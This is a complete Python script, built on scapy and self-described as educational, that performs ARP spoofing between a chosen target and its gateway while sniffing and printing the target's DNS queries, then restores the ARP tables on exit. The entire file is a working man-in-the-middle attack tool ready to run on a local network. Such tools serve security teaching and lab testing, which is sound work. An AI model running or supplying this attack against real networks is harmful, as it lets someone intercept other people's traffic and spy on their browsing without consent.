import argparse
import sys
import threading
import time

import scapy.all as scapy
from colorama import Fore, init
from scapy.layers.dns import DNS, DNSQR
from scapy.layers.inet import IP

init(autoreset=True)


class ArpSpoofer:
    def __init__(self, target_ip, spoof_ip, interface):
        self.target_ip = target_ip
        self.spoof_ip = spoof_ip
        self.interface = interface
        self.running = True  # Loop control flag for safe termination

    def get_mac(self, ip):
        request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        final_packet = broadcast / request
        answer = scapy.srp(final_packet, iface=self.interface, timeout=2, verbose=False)[0]
        
        if answer:
            return answer[0][1].hwsrc
        return None

    def spoof(self, target_ip, target_mac, spoof_ip):
        # Encapsulate ARP packet inside an Ethernet frame for Layer 2 transmission
        ether = scapy.Ether(dst=target_mac)
        arp = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        packet = ether / arp
        scapy.sendp(packet, iface=self.interface, verbose=False)

    def restore(self, dest_ip, dest_mac, source_ip, source_mac):
        ether = scapy.Ether(dst=dest_mac)
        arp = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
        packet = ether / arp
        # Send restoration packet multiple times to ensure the target's ARP cache is correctly updated
        scapy.sendp(packet, count=4, iface=self.interface, verbose=False)

    def run(self):
        print(Fore.CYAN + "[*] Resolving MAC addresses...")
        self.target_mac = self.get_mac(self.target_ip)
        self.spoof_mac = self.get_mac(self.spoof_ip)

        if not self.target_mac or not self.spoof_mac:
            print(Fore.RED + "[-] Could not resolve MAC address for target or spoof IP. Check connectivity.")
            sys.exit(1)

        print(Fore.GREEN + f"[+] Target MAC ({self.target_ip}): {self.target_mac}")
        print(Fore.GREEN + f"[+] Gateway MAC ({self.spoof_ip}): {self.spoof_mac}")

        while self.running:
            self.spoof(self.target_ip, self.target_mac, self.spoof_ip)
            self.spoof(self.spoof_ip, self.spoof_mac, self.target_ip)
            time.sleep(2)  # Delay to prevent network flooding

    def stop(self):
        self.running = False
        print(Fore.YELLOW + "\n[*] Restoring ARP tables... Please wait.")
        self.restore(self.target_ip, self.target_mac, self.spoof_ip, self.spoof_mac)
        self.restore(self.spoof_ip, self.spoof_mac, self.target_ip, self.target_mac)
        print(Fore.GREEN + "[+] ARP tables restored successfully.")


def process_dns_packet(packet):
    # Extract DNS queries (QR == 0 indicates a query, not a response)
    if packet.haslayer(DNS) and packet.haslayer(DNSQR) and packet.getlayer(DNS).qr == 0:
        if packet.haslayer(IP):
            ip_src = packet[IP].src
            try:
                dns_query = packet[DNSQR].qname.decode('utf-8')
                print(Fore.MAGENTA + f"{ip_src:<15} \t {dns_query:<30}")
            except Exception:
                pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Educational ARP Spoofing & DNS Sniffing Tool.")
    parser.add_argument("-t", "--target", required=True, help="Target IP address.")
    parser.add_argument("-s", "--spoof", required=True, help="Spoofed IP address (Gateway).")
    parser.add_argument("-i", "--interface", required=True, help="Network interface.")
    args = parser.parse_args()

    spoofer = ArpSpoofer(target_ip=args.target, spoof_ip=args.spoof, interface=args.interface)

    # Execute ARP spoofing in a background thread
    spoof_thread = threading.Thread(target=spoofer.run)
    spoof_thread.daemon = True
    spoof_thread.start()

    # Allow time for MAC resolution before initiating the sniffer
    time.sleep(3)
    
    print(Fore.CYAN + "\n[*] Starting DNS Sniffer... Press CTRL+C to stop.")
    print(f"{'IP Address':<15} \t {'DNS Query':<30}")
    print("-" * 40)

    try:
        # Run DNS sniffing on the main thread
        scapy.sniff(filter="udp port 53", prn=process_dns_packet, store=0, iface=args.interface)
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Detected CTRL+C. Stopping...")
        spoofer.stop()
        sys.exit(0)
        